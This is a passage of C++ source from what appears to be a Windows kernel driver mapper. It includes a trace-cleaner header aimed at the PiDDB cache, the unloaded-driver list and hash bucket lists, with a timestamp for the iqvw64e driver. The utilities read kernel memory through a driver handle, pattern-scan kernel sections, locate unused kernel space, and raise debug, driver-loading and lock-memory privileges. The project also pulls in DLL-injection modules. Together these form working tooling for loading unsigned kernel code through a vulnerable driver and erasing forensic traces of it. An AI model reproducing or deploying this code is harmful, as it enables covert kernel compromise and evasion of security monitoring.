    hash_bucket_entry_t* entry_list;  // offset 0x18 (k[3], (__int64 *)k[3])
    std::uint32_t entry_count;        // offset 0x20 (v7 = (int *)(v14 + 32))
    std::uint32_t unknown2;           // offset 0x24
    std::uint32_t flag1;              // offset 0x28 (*((_DWORD *)k + 0xA))
    std::uint32_t flag2;              // offset 0x2C (*((_DWORD *)k + 0xC))
  };

  struct rtl_balanced_links_t {
    struct rtl_balanced_links_t* parent;
    struct rtl_balanced_links_t* left_child;
    struct rtl_balanced_links_t* right_child;
    char balance;
    unsigned char reserved[3];
  };

  struct rtl_avl_table_t {
    rtl_balanced_links_t balanced_root;
    void* ordered_pointer;
    std::uint32_t which_ordered_element;
    std::uint32_t number_generic_table_elements;
    std::uint32_t depth_of_tree;
    void* restart_key;
    std::uint32_t delete_count;
    void* compare_routine;
    void* allocate_routine;
    void* free_routine;
    void* table_context;
  };

  struct lookaside_list_ex_t {
    struct general_lookaside_pool_t {
      union {
        SLIST_HEADER list_head;
        SINGLE_LIST_ENTRY single_list_head;
      };
      USHORT depth;           // +0x10
      USHORT maximum_depth;   // +0x12
      ULONG total_allocates;  // +0x14
      union {
        ULONG allocate_misses;  // +0x18
        ULONG allocate_hits;    // +0x18
      };
      ULONG total_frees;  // +0x1c
      union {
        ULONG free_misses;  // +0x20
        ULONG free_hits;    // +0x20
      };
      ULONG type;                  // +0x24 (POOL_TYPE)
      ULONG tag;                   // +0x28
      ULONG size;                  // +0x2c
      PVOID allocate_ex;           // +0x30
      PVOID free_ex;               // +0x38
      LIST_ENTRY list_entry;       // +0x40
      ULONG last_total_allocates;  // +0x50
      union {
        ULONG last_allocate_misses;  // +0x54
        ULONG last_allocate_hits;    // +0x54
      };
      ULONG future[2];  // +0x58
    } L;
  };

  // MiPinDriverAddress struct
  struct pin_driver_log_entry_t {
    std::uint32_t flags_and_address_low;
    std::uint32_t address_high;
  };

  // resource management helpers
  auto acquire_resource_exclusive(HANDLE device_handle, void* resource, bool wait) -> bool;
  auto release_resource(HANDLE device_handle, void* resource) -> bool;

  // AVL table operations
  auto lookup_element_generic_table_avl(HANDLE device_handle, rtl_avl_table_t* table,
                                        piddb_cache_entry_t* local_entry) -> std::uint64_t;
  auto delete_element_generic_table_avl(HANDLE device_handle, void* table, void* buffer) -> bool;

  // list manipulation
  auto unlink_list_entry(HANDLE device_handle, std::uint64_t entry_addr) -> bool;
  auto free_pool_memory(HANDLE device_handle, std::uint64_t address) -> bool;

  // enumeration helpers
  auto find_driver_in_piddb_entries(HANDLE device_handle, std::uint64_t piddb_table_addr)
      -> std::pair<std::wstring, std::uint64_t>;
  auto find_driver_in_hash_bucket_list(HANDLE device_handle, std::uint64_t ci_base,
                                       const std::string& driver_name) -> bool;
  auto find_driver_in_unloaded_list(HANDLE device_handle, const std::string& driver_name) -> bool;
  auto print_pe_process_hash_bucket_list(HANDLE device_handle) -> bool;

  // consts
  static constexpr std::uint32_t iqvw64e_timestamp = 0x5284EAC3;
};

// global trace cleaner instance
inline std::unique_ptr<trace_cleaner_t> g_trace_cleaner = std::make_unique<trace_cleaner_t>();
```

`client/driver_mapper/utils.cpp`:

```cpp
#include "utils.hpp"
#include <fstream>
#include <algorithm>
#include <chrono>
#include <sstream>
#include <iomanip>
#include "memory_manager.hpp"
#include <NTSecAPI.h>

#define STATUS_SUCCESS 0x00000000
#define STATUS_UNSUCCESSFUL 0xC0000001
#define STATUS_OBJECT_NAME_NOT_FOUND 0xC0000034
auto utils_t::write_memory_to_file(const std::wstring& file_path, const void* data,
                                   std::size_t size) -> bool {
  std::ofstream file(file_path, std::ios::binary);
  if (!file.is_open()) {
    return false;
  }

  return file.write(reinterpret_cast<const char*>(data), size).good();
}

auto utils_t::create_file_from_memory(const std::wstring& desired_file_path, const char* address,
                                      std::size_t size) -> bool {
  return write_memory_to_file(desired_file_path, address, size);
}

auto utils_t::read_file(const std::string& file_path) -> std::vector<uint8_t> {
  std::ifstream file(file_path, std::ios::binary | std::ios::ate);
  if (!file.is_open()) {
    return {};
  }

  std::streamsize size = file.tellg();
  file.seekg(0, std::ios::beg);

  std::vector<uint8_t> buffer(size);
  if (!file.read(reinterpret_cast<char*>(buffer.data()), size)) {
    return {};
  }

  return buffer;
}
auto utils_t::get_temp_path() -> std::wstring {
  wchar_t temp_path[MAX_PATH + 1] = {0};
  auto result = GetTempPathW(sizeof(temp_path) / sizeof(wchar_t), temp_path);
  if (result == 0 || result > MAX_PATH) {
    return L"";
  }

  // remove trailing backslash if present
  std::wstring path(temp_path);
  if (!path.empty() && path.back() == L'\\') {
    path.pop_back();
  }

  return path;
}

auto utils_t::get_kernel_module_address(const std::string& module_name) -> std::uint64_t {
  void* buffer = nullptr;
  ULONG buffer_size = 0;

  auto status =
      NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemModuleInformation),
                               buffer, buffer_size, &buffer_size);

  while (status == STATUS_INFO_LENGTH_MISMATCH) {
    if (buffer) {
      SIZE_T region_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, &buffer, &region_size, MEM_RELEASE);
    }

    SIZE_T alloc_size = buffer_size;
    status = NtAllocateVirtualMemory(NtCurrentProcess, &buffer, 0, &alloc_size,
                                     MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!NT_SUCCESS(status)) {
      return 0;
    }

    status =
        NtQuerySystemInformation(static_cast<SYSTEM_INFORMATION_CLASS>(SystemModuleInformation),
                                 buffer, buffer_size, &buffer_size);
  }

  if (!NT_SUCCESS(status) || !buffer) {
    if (buffer) {
      SIZE_T region_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, &buffer, &region_size, MEM_RELEASE);
    }
    return 0;
  }

  auto modules = static_cast<rtl_process_modules_t*>(buffer);
  std::uint64_t result = 0;

  for (auto i = 0u; i < modules->number_of_modules; ++i) {
    auto current_module_name =
        std::string(reinterpret_cast<char*>(modules->modules[i].full_path_name) +
                    modules->modules[i].offset_to_file_name);

    if (_stricmp(current_module_name.c_str(), module_name.c_str()) == 0) {
      result = reinterpret_cast<std::uint64_t>(modules->modules[i].image_base);
      break;
    }
  }

  SIZE_T region_size = 0;
  NtFreeVirtualMemory(NtCurrentProcess, &buffer, &region_size, MEM_RELEASE);
  return result;
}

auto utils_t::find_pattern(std::uintptr_t address, std::uintptr_t length,
                           const std::uint8_t* pattern, const char* mask) -> std::uintptr_t {
  auto mask_length = std::strlen(mask);
  auto max_search = length - mask_length;

  for (std::uintptr_t i = 0; i < max_search; ++i) {
    if (compare_memory(reinterpret_cast<const std::uint8_t*>(address + i), pattern, mask)) {
      return address + i;
    }
  }

  return 0;
}

auto utils_t::find_pattern_at_kernel(HANDLE device_handle, std::uintptr_t address,
                                     std::uintptr_t length, const std::uint8_t* pattern,
                                     const char* mask) -> std::uintptr_t {
  if (!address) {
    return 0;
  }

  if (length > 1024 * 1024 * 1024) {  // if read is > 1GB
    return 0;
  }

  auto section_data = std::make_unique<std::uint8_t[]>(length);
  if (!g_memory_manager->read_memory(device_handle, address, section_data.get(), length)) {
    return 0;
  }

  auto result =
      find_pattern(reinterpret_cast<std::uintptr_t>(section_data.get()), length, pattern, mask);

  if (result <= 0) {
    return 0;
  }

  result = address - reinterpret_cast<std::uintptr_t>(section_data.get()) + result;
  return result;
}

auto utils_t::find_section(const char* section_name, std::uintptr_t module_ptr, std::uint32_t* size)
    -> std::uintptr_t {
  if (!module_ptr || !section_name) {
    return 0;
  }

  auto dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(module_ptr);
  if (dos_header->e_magic != IMAGE_DOS_SIGNATURE) {
    return 0;
  }

  auto nt_headers = reinterpret_cast<IMAGE_NT_HEADERS*>(module_ptr + dos_header->e_lfanew);
  if (nt_headers->Signature != IMAGE_NT_SIGNATURE) {
    return 0;
  }

  auto section_header = reinterpret_cast<IMAGE_SECTION_HEADER*>(
      reinterpret_cast<std::uintptr_t>(&nt_headers->OptionalHeader) +
      nt_headers->FileHeader.SizeOfOptionalHeader);

  for (auto i = 0; i < nt_headers->FileHeader.NumberOfSections; ++i) {
    if (strcmp(reinterpret_cast<char*>(section_header[i].Name), section_name) == 0) {
      if (size) {
        *size = section_header[i].Misc.VirtualSize;
      }
      return module_ptr + section_header[i].VirtualAddress;
    }
  }

  return 0;
}

auto utils_t::find_section_at_kernel(HANDLE device_handle, const char* section_name,
                                     std::uintptr_t module_ptr, std::uint32_t* size)
    -> std::uintptr_t {
  if (!module_ptr || !section_name) {
    return 0;
  }

  std::uint8_t headers[0x1000];
  if (!g_memory_manager->read_memory(device_handle, module_ptr, headers, sizeof(headers))) {
    return 0;
  }

  std::uint32_t section_size = 0;
  auto section =
      find_section(section_name, reinterpret_cast<std::uintptr_t>(headers), &section_size);

  if (!section || !section_size) {
    return 0;
  }

  if (size) {
    *size = section_size;
  }

  return section - reinterpret_cast<std::uintptr_t>(headers) + module_ptr;
}

auto utils_t::find_pattern_in_section_at_kernel(HANDLE device_handle, const char* section_name,
                                                std::uintptr_t module_ptr,
                                                const std::uint8_t* pattern, const char* mask)
    -> std::uintptr_t {
  std::uint32_t section_size = 0;
  auto section = find_section_at_kernel(device_handle, section_name, module_ptr, &section_size);

  if (!section || !section_size) {
    return 0;
  }

  return find_pattern_at_kernel(device_handle, section, section_size, pattern, mask);
}

auto utils_t::resolve_relative_address(HANDLE device_handle, void* instruction,
                                       std::uint32_t offset_offset, std::uint32_t instruction_size)
    -> void* {
  auto instr = reinterpret_cast<std::uintptr_t>(instruction);
  std::int32_t rip_offset = 0;

  if (!g_memory_manager->read_memory(device_handle, instr + offset_offset, &rip_offset,
                                     sizeof(std::int32_t))) {
    return nullptr;
  }

  auto resolved_addr = reinterpret_cast<void*>(instr + instruction_size + rip_offset);
  return resolved_addr;
}
auto utils_t::compare_memory(const std::uint8_t* data, const std::uint8_t* pattern,
                             const char* mask) -> bool {
  for (; *mask; ++mask, ++data, ++pattern) {
    if (*mask == 'x' && *data != *pattern) {
      return false;
    }
  }
  return *mask == '\0';
}

auto utils_t::get_current_process_id() -> std::uint32_t {
  return GetCurrentProcessId();
}

auto utils_t::get_current_thread_id() -> std::uint32_t {
  return GetCurrentThreadId();
}

auto utils_t::get_error_as_string(DWORD error_message_id) -> std::string {
  LPSTR message_buffer = nullptr;
  auto size = FormatMessageA(FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM |
                                 FORMAT_MESSAGE_IGNORE_INSERTS,
                             NULL, error_message_id, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
                             (LPSTR)&message_buffer, 0, NULL);
  std::string message(message_buffer, size);
  LocalFree(message_buffer);
  return message;
}

auto utils_t::get_current_user_sid() -> std::unique_ptr<void, decltype(&free)> {
  HANDLE h_token = NULL;
  DWORD dw_token_length = 0;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h_token)) {
    return {nullptr, free};
  }

  // Get required buffer size
  GetTokenInformation(h_token, TokenUser, NULL, 0, &dw_token_length);
  if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    CloseHandle(h_token);
    return {nullptr, free};
  }

  // Allocate buffer and get token info
  auto p_token_user = std::make_unique<char[]>(dw_token_length);
  auto token_user = reinterpret_cast<PTOKEN_USER>(p_token_user.get());

  if (!GetTokenInformation(h_token, TokenUser, token_user, dw_token_length, &dw_token_length)) {
    CloseHandle(h_token);
    return {nullptr, free};
  }

  // Copy the SID
  auto sid_length = GetLengthSid(token_user->User.Sid);
  auto p_sid = std::unique_ptr<void, decltype(&free)>(std::malloc(sid_length), free);

  if (p_sid && CopySid(sid_length, p_sid.get(), token_user->User.Sid)) {
    CloseHandle(h_token);
    return p_sid;
  }

  CloseHandle(h_token);
  return {nullptr, free};
}

auto utils_t::get_policy_handle(WCHAR* system_name) -> LSA_HANDLE {
  LSA_OBJECT_ATTRIBUTES object_attributes;
  LSA_UNICODE_STRING lus_system_name;
  LSA_HANDLE lsah_policy_handle;

  ZeroMemory(&object_attributes, sizeof(object_attributes));

  PLSA_UNICODE_STRING p_system_name = nullptr;
  if (system_name) {
    auto system_name_length = static_cast<USHORT>(wcslen(system_name));
    lus_system_name.Buffer = system_name;
    lus_system_name.Length = system_name_length * sizeof(WCHAR);
    lus_system_name.MaximumLength = (system_name_length + 1) * sizeof(WCHAR);
    p_system_name = &lus_system_name;
  }

  auto nts_result =
      LsaOpenPolicy(p_system_name, &object_attributes, POLICY_ALL_ACCESS, &lsah_policy_handle);

  if (nts_result != STATUS_SUCCESS) {
    return NULL;
  }

  return lsah_policy_handle;
}

auto utils_t::init_lsa_string(PVOID p_lsa_string, LPCWSTR pwsz_string) -> bool {
  auto p_lsa_unicode_string = static_cast<PLSA_UNICODE_STRING>(p_lsa_string);

  DWORD dw_len = 0;
  if (!p_lsa_unicode_string) {
    return false;
  }

  if (pwsz_string) {
    dw_len = static_cast<DWORD>(wcslen(pwsz_string));
    if (dw_len > 0x7ffe) {
      return false;
    }
  }

  p_lsa_unicode_string->Buffer = const_cast<WCHAR*>(pwsz_string);
  p_lsa_unicode_string->Length = static_cast<USHORT>(dw_len * sizeof(WCHAR));
  p_lsa_unicode_string->MaximumLength = static_cast<USHORT>((dw_len + 1) * sizeof(WCHAR));

  return true;
}

auto utils_t::check_privilege_exists(PSID account_sid, LSA_HANDLE policy_handle) -> bool {
  LSA_UNICODE_STRING* user_rights = nullptr;
  ULONG count_of_rights = 0;

  auto nts_result =
      LsaEnumerateAccountRights(policy_handle, account_sid, &user_rights, &count_of_rights);

  if (nts_result == STATUS_SUCCESS) {
    for (ULONG i = 0; i < count_of_rights; i++) {
      std::wstring privilege_name(user_rights[i].Buffer, user_rights[i].Length / sizeof(WCHAR));
      if (privilege_name == L"SeLockMemoryPrivilege") {
        LsaFreeMemory(user_rights);
        return true;
      }
    }
    LsaFreeMemory(user_rights);
    return false;
  } else if (nts_result == STATUS_OBJECT_NAME_NOT_FOUND) {  // STATUS_OBJECT_NAME_NOT_FOUND
    return false;
  } else {
    return false;
  }
}

auto utils_t::add_privileges_to_account(PSID account_sid, LSA_HANDLE policy_handle) -> void {
  LSA_UNICODE_STRING luc_privilege;

  if (!init_lsa_string(&luc_privilege, L"SeLockMemoryPrivilege")) {
    return;
  }

  auto nts_result = LsaAddAccountRights(policy_handle, account_sid, &luc_privilege, 1);
  // Note: You might want to log the result here for debugging
}

auto utils_t::check_lock_memory_privilege() -> NTSTATUS {
  HANDLE h_token = NULL;
  DWORD token_privileges_size = 0;

  if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &h_token)) {
    return STATUS_UNSUCCESSFUL;
  }

  // Get required buffer size
  GetTokenInformation(h_token, TokenPrivileges, NULL, 0, &token_privileges_size);
  if (GetLastError() != ERROR_INSUFFICIENT_BUFFER) {
    CloseHandle(h_token);
    return STATUS_UNSUCCESSFUL;
  }

  auto token_privileges_buffer = std::make_unique<char[]>(token_privileges_size);
  auto token_privileges = reinterpret_cast<PTOKEN_PRIVILEGES>(token_privileges_buffer.get());

  if (!GetTokenInformation(h_token, TokenPrivileges, token_privileges, token_privileges_size,
                           &token_privileges_size)) {
    CloseHandle(h_token);
    return STATUS_UNSUCCESSFUL;
  }

  // Look up SeLockMemoryPrivilege LUID
  LUID lock_memory_luid;
  if (!LookupPrivilegeValueW(NULL, L"SeLockMemoryPrivilege", &lock_memory_luid)) {
    CloseHandle(h_token);
    return STATUS_UNSUCCESSFUL;
  }

  // Check if the privilege exists in token
  for (DWORD i = 0; i < token_privileges->PrivilegeCount; i++) {
    if (token_privileges->Privileges[i].Luid.LowPart == lock_memory_luid.LowPart &&
        token_privileges->Privileges[i].Luid.HighPart == lock_memory_luid.HighPart) {
      auto attributes = token_privileges->Privileges[i].Attributes;

      if (attributes & SE_PRIVILEGE_ENABLED) {
        CloseHandle(h_token);
        return STATUS_SUCCESS;
      } else {
        CloseHandle(h_token);
        return STATUS_UNSUCCESSFUL;
      }
    }
  }

  CloseHandle(h_token);
  return STATUS_UNSUCCESSFUL;
}

auto utils_t::add_lock_memory_privilege() -> NTSTATUS {
  // get current user's SID
  auto current_user_sid = get_current_user_sid();
  if (!current_user_sid) {
    return STATUS_UNSUCCESSFUL;
  }

  // get policy handle
  auto policy_handle = get_policy_handle();
  if (!policy_handle) {
    return STATUS_UNSUCCESSFUL;
  }

  // check if privilege already exists
  if (check_privilege_exists(static_cast<PSID>(current_user_sid.get()), policy_handle)) {
    LsaClose(policy_handle);
    return STATUS_SUCCESS;
  }

  // add the privilege
  add_privileges_to_account(static_cast<PSID>(current_user_sid.get()), policy_handle);

  // cleanup
  LsaClose(policy_handle);

  return STATUS_SUCCESS;
}

auto utils_t::ensure_lock_memory_privilege() -> NTSTATUS {
  // check if the privilege is already enabled in the current process
  auto status = check_lock_memory_privilege();
  if (NT_SUCCESS(status)) {
    return STATUS_SUCCESS;
  }

  // if not enabled, try to add it to the user account
  status = add_lock_memory_privilege();
  if (!NT_SUCCESS(status)) {
    return status;
  }

  return STATUS_SUCCESS;
}

auto utils_t::enable_privilege(const std::wstring& privilege_name) -> bool {
  HANDLE token_handle = nullptr;
  if (!NT_SUCCESS(NtOpenProcessToken(NtCurrentProcess, TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY,
                                     &token_handle))) {
    return false;
  }

  LUID privilege_luid = {};
  if (!LookupPrivilegeValueW(nullptr, privilege_name.c_str(), &privilege_luid)) {
    NtClose(token_handle);
    return false;
  }

  TOKEN_PRIVILEGES token_privileges = {};
  token_privileges.PrivilegeCount = 1;
  token_privileges.Privileges[0].Luid = privilege_luid;
  token_privileges.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;

  auto result = NT_SUCCESS(NtAdjustPrivilegesToken(token_handle, FALSE, &token_privileges,
                                                   sizeof(TOKEN_PRIVILEGES), nullptr, nullptr));

  NtClose(token_handle);
  return result;
}

auto utils_t::initialize_dependencies() -> bool {
  // enable necessary privileges
  if (!enable_privilege(L"SeDebugPrivilege")) {
    return false;
  }

  if (!enable_privilege(L"SeLoadDriverPrivilege")) {
    return false;
  }

  if (!enable_privilege(L"SeLockMemoryPrivilege")) {
    return false;
  }

  return true;
}

auto utils_t::get_kernel_module_export(HANDLE device_handle, std::uint64_t kernel_module_base,
                                       const std::string& function_name) -> std::uint64_t {
  if (!kernel_module_base)
    return 0;

  IMAGE_DOS_HEADER dos_header = {0};
  IMAGE_NT_HEADERS64 nt_headers = {0};

  if (!g_memory_manager->read_memory(device_handle, kernel_module_base, &dos_header,
                                     sizeof(dos_header)) ||
      dos_header.e_magic != IMAGE_DOS_SIGNATURE ||
      !g_memory_manager->read_memory(device_handle, kernel_module_base + dos_header.e_lfanew,
                                     &nt_headers, sizeof(nt_headers)) ||
      nt_headers.Signature != IMAGE_NT_SIGNATURE)
    return 0;

  const auto export_base =
      nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
  const auto export_base_size =
      nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;

  if (!export_base || !export_base_size)
    return 0;

  PIMAGE_EXPORT_DIRECTORY export_data = nullptr;
  SIZE_T export_data_size = export_base_size;
  auto status =
      NtAllocateVirtualMemory(NtCurrentProcess, reinterpret_cast<void**>(&export_data), 0,
                              &export_data_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

  if (!NT_SUCCESS(status) || !export_data)
    return 0;

  if (!g_memory_manager->read_memory(device_handle, kernel_module_base + export_base, export_data,
                                     export_base_size)) {
    SIZE_T free_size = 0;
    NtFreeVirtualMemory(NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size,
                        MEM_RELEASE);
    return 0;
  }

  const auto delta = reinterpret_cast<uint64_t>(export_data) - export_base;

  const auto name_table = reinterpret_cast<uint32_t*>(export_data->AddressOfNames + delta);
  const auto ordinal_table =
      reinterpret_cast<uint16_t*>(export_data->AddressOfNameOrdinals + delta);
  const auto function_table = reinterpret_cast<uint32_t*>(export_data->AddressOfFunctions + delta);

  for (auto i = 0u; i < export_data->NumberOfNames; ++i) {
    const std::string current_function_name =
        std::string(reinterpret_cast<char*>(name_table[i] + delta));

    if (!stricmp(current_function_name.c_str(), function_name.c_str())) {
      const auto function_ordinal = ordinal_table[i];
      if (function_table[function_ordinal] <= 0x1000) {
        // wrong function address?
        SIZE_T free_size = 0;
        NtFreeVirtualMemory(NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size,
                            MEM_RELEASE);
        return 0;
      }
      const auto function_address = kernel_module_base + function_table[function_ordinal];

      if (function_address >= kernel_module_base + export_base &&
          function_address <= kernel_module_base + export_base + export_base_size) {
        SIZE_T free_size = 0;
        NtFreeVirtualMemory(NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size,
                            MEM_RELEASE);
        return 0;
      }

      SIZE_T free_size = 0;
      NtFreeVirtualMemory(NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size,
                          MEM_RELEASE);
      return function_address;
    }
  }

  SIZE_T free_size = 0;
  NtFreeVirtualMemory(NtCurrentProcess, reinterpret_cast<void**>(&export_data), &free_size,
                      MEM_RELEASE);
  return 0;
}

// helper function to find a section in kernel module
auto utils_t::find_kernel_section(HANDLE device_handle, const char* section_name,
                                  std::uint64_t module_base, std::uint32_t* section_size)
    -> std::uint64_t {
  // read DOS header
  IMAGE_DOS_HEADER dos_header{};
  if (!g_memory_manager->read_memory(device_handle, module_base, &dos_header, sizeof(dos_header))) {
    return 0;
  }

  if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
    return 0;
  }

  // read NT headers
  IMAGE_NT_HEADERS64 nt_headers{};
  auto nt_headers_addr = module_base + dos_header.e_lfanew;
  if (!g_memory_manager->read_memory(device_handle, nt_headers_addr, &nt_headers,
                                     sizeof(nt_headers))) {
    return 0;
  }

  if (nt_headers.Signature != IMAGE_NT_SIGNATURE) {
    return 0;
  }

  // iterate through sections
  auto section_header_addr = nt_headers_addr + sizeof(DWORD) + sizeof(IMAGE_FILE_HEADER) +
                             nt_headers.FileHeader.SizeOfOptionalHeader;

  for (auto i = 0; i < nt_headers.FileHeader.NumberOfSections; ++i) {
    IMAGE_SECTION_HEADER section{};
    auto current_section_addr = section_header_addr + (i * sizeof(IMAGE_SECTION_HEADER));

    if (!g_memory_manager->read_memory(device_handle, current_section_addr, &section,
                                       sizeof(section))) {
      continue;
    }

    // compare section name
    if (std::memcmp(section.Name, section_name, std::strlen(section_name)) == 0) {
      *section_size = section.Misc.VirtualSize;
      return module_base + section.VirtualAddress;
    }
  }

  return 0;
}

// helper function to find unused space in a memory region
auto utils_t::find_unused_space(HANDLE device_handle, std::uint64_t start_addr,
                                std::uint32_t region_size, std::uint32_t required_size,
                                std::uint32_t alignment) -> std::uint64_t {
  // ensure alignment is at least PAGE_SIZE
  if (alignment < PAGE_SIZE) {
    alignment = PAGE_SIZE;
  }

  // buffer to read chunks of memory
  const auto chunk_size = 0x1000;  // 4KB chunks
  auto buffer = std::make_unique<std::uint8_t[]>(chunk_size);

  // scan the region for unused space
  for (auto current_addr = start_addr; current_addr + required_size <= start_addr + region_size;
       current_addr += alignment) {
    bool found_unused = true;

    // check if the required size is all zeros (unused)
    for (auto offset = 0u; offset < required_size; offset += chunk_size) {
      auto read_size = min(chunk_size, required_size - offset);

      if (!g_memory_manager->read_memory(device_handle, current_addr + offset, buffer.get(),
                                         read_size)) {
        found_unused = false;
        break;
      }

      // check if all bytes are zero
      for (auto i = 0u; i < read_size; ++i) {
        if (buffer[i] != 0) {
          found_unused = false;
          break;
        }
      }

      if (!found_unused)
        break;
    }

    if (found_unused) {
      return current_addr;
    }
  }

  return 0;
}

```

`client/driver_mapper/utils.hpp`:

```hpp
#pragma once

#include <Windows.h>
#include <string>
#include <vector>
#include <random>
#include <memory>

#define DISABLE_DEBUG_PRINT_MAPPER 0
#if DISABLE_DEBUG_PRINT_MAPPER
  #define mapper_log(level, format, ...) ((void)0)
#else
  #define mapper_log(level, format, ...)                                  \
    do {                                                                  \
      const char* prefix;                                                 \
      if (strcmp(level, "SUCCESS") == 0)                                  \
        prefix = "[+]";                                                   \
      else if (strcmp(level, "ERROR") == 0)                               \
        prefix = "[!]";                                                   \
      else if (strcmp(level, "WARNING") == 0)                             \
        prefix = "[-]";                                                   \
      else                                                                \
        prefix = "[?]";                                                   \
      printf("%s %s: " format "\n", prefix, __FUNCTION__, ##__VA_ARGS__); \
    } while (0)
#endif

// system information classes
typedef enum _SYSTEM_INFORMATION_CLASS {
  SystemModuleInformation = 11,
  SystemExtendedHandleInformation = 64
} SYSTEM_INFORMATION_CLASS;

// status definitions
#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
#define STATUS_INFO_LENGTH_MISMATCH 0xC0000004

// forward declarations for external NT functions
extern "C" {
NTSTATUS NtQuerySystemInformation(SYSTEM_INFORMATION_CLASS SystemInformationClass,
                                  PVOID SystemInformation, ULONG SystemInformationLength,
                                  PULONG ReturnLength);
NTSTATUS NtAllocateVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, ULONG_PTR ZeroBits,
                                 PSIZE_T RegionSize, ULONG AllocationType, ULONG Protect);
NTSTATUS NtFreeVirtualMemory(HANDLE ProcessHandle, PVOID* BaseAddress, PSIZE_T RegionSize,
                             ULONG FreeType);
NTSTATUS NtAdjustPrivilegesToken(HANDLE TokenHandle, BOOLEAN DisableAllPrivileges,
                                 PTOKEN_PRIVILEGES NewState, ULONG BufferLength,
                                 PTOKEN_PRIVILEGES PreviousState, PULONG ReturnLength);
NTSTATUS NtOpenProcessToken(HANDLE ProcessHandle, ACCESS_MASK DesiredAccess, PHANDLE TokenHandle);
NTSTATUS NtClose(HANDLE Handle);
}

#define NtCurrentProcess ((HANDLE)(LONG_PTR)-1)

class utils_t {
public:
  utils_t() = default;
  ~utils_t() = default;

  // file operations
  auto write_memory_to_file(const std::wstring& file_path, const void* data, std::size_t size)
      -> bool;
  auto create_file_from_memory(const std::wstring& desired_file_path, const char* address,
                               std::size_t size) -> bool;

  auto read_file(const std::string& file_path) -> std::vector<uint8_t>;

  // path operations
  auto get_temp_path() -> std::wstring;

  // kernel module operations
  auto get_kernel_module_address(const std::string& module_name) -> std::uint64_t;
  auto get_kernel_module_export(HANDLE device_handle, std::uint64_t kernel_module_base,
                                const std::string& function_name) -> std::uint64_t;

  // pattern scanning
  auto find_pattern(std::uintptr_t address, std::uintptr_t length, const std::uint8_t* pattern,
                    const char* mask) -> std::uintptr_t;

  auto find_pattern_at_kernel(HANDLE device_handle, std::uintptr_t address, std::uintptr_t length,
                              const std::uint8_t* pattern, const char* mask) -> std::uintptr_t;
  auto find_section_at_kernel(HANDLE device_handle, const char* section_name,
                              std::uintptr_t module_ptr, std::uint32_t* size = nullptr)
      -> std::uintptr_t;
  auto find_pattern_in_section_at_kernel(HANDLE device_handle, const char* section_name,
                                         std::uintptr_t module_ptr, const std::uint8_t* pattern,
                                         const char* mask) -> std::uintptr_t;
  auto find_section(const char* section_name, std::uintptr_t module_ptr,
                    std::uint32_t* size = nullptr) -> std::uintptr_t;

  auto find_unused_space(HANDLE device_handle, std::uint64_t start_addr, std::uint32_t region_size,
                         std::uint32_t required_size, std::uint32_t alignment) -> std::uint64_t;
  auto find_kernel_section(HANDLE device_handle, const char* section_name,
                           std::uint64_t module_base, std::uint32_t* section_size) -> std::uint64_t;
  auto resolve_relative_address(HANDLE device_handle, void* instruction,
                                std::uint32_t offset_offset, std::uint32_t instruction_size)
      -> void*;
  auto compare_memory(const std::uint8_t* data, const std::uint8_t* pattern, const char* mask)
      -> bool;

  // process operations
  auto get_current_process_id() -> std::uint32_t;
  auto get_current_thread_id() -> std::uint32_t;
  auto enable_privilege(const std::wstring& privilege_name) -> bool;

  auto check_lock_memory_privilege() -> NTSTATUS;
  auto ensure_lock_memory_privilege() -> NTSTATUS;
  auto add_lock_memory_privilege() -> NTSTATUS;

  // initialization
  auto initialize_dependencies() -> bool;

private:
  // system module enumeration structures
  struct rtl_process_module_information_t {
    HANDLE section;
    void* mapped_base;
    void* image_base;
    std::uint32_t image_size;
    std::uint32_t flags;
    std::uint16_t load_order_index;
    std::uint16_t init_order_index;
    std::uint16_t load_count;
    std::uint16_t offset_to_file_name;
    unsigned char full_path_name[256];
  };

  struct rtl_process_modules_t {
    std::uint32_t number_of_modules;
    rtl_process_module_information_t modules[1];
  };

  auto get_current_user_sid() -> std::unique_ptr<void, decltype(&free)>;
  auto get_policy_handle(WCHAR* system_name = nullptr) -> PVOID;
  auto init_lsa_string(PVOID p_lsa_string, LPCWSTR pwsz_string) -> bool;
  auto check_privilege_exists(PVOID account_sid, PVOID policy_handle) -> bool;
  auto add_privileges_to_account(PVOID account_sid, PVOID policy_handle) -> void;
  auto get_error_as_string(DWORD error_message_id) -> std::string;
};

// global utils instance
inline std::unique_ptr<utils_t> g_utils = std::make_unique<utils_t>();
```

`client/entry.cpp`:

```cpp
#include <windows.h>

#include <iostream>
#include <string>
#include <vector>
#include <fstream>
#include <filesystem>

#include "lib/cli.h"
#include "driver/driver_shell.h"
#include "utils/logging.h"
#include "driver_mapper/service_manager.hpp"
#include "driver_mapper/driver_mapper.hpp"
#include "driver/driver_manager.hpp"
#include "driver_mapper/utils.hpp"
#include "inject/dll_mapper.hpp"
#include "utils/window_manager.hpp"
#include "inject/dll_shell.h"

long crash_handler(EXCEPTION_POINTERS* exception_info) {
  if (exception_info && exception_info->ExceptionRecord)
    debug_log("ERROR", "exception occurred at address: %p with exception code: 0x%lx",
              exception_info->ExceptionRecord->ExceptionAddress,
              exception_info->ExceptionRecord->ExceptionCode);

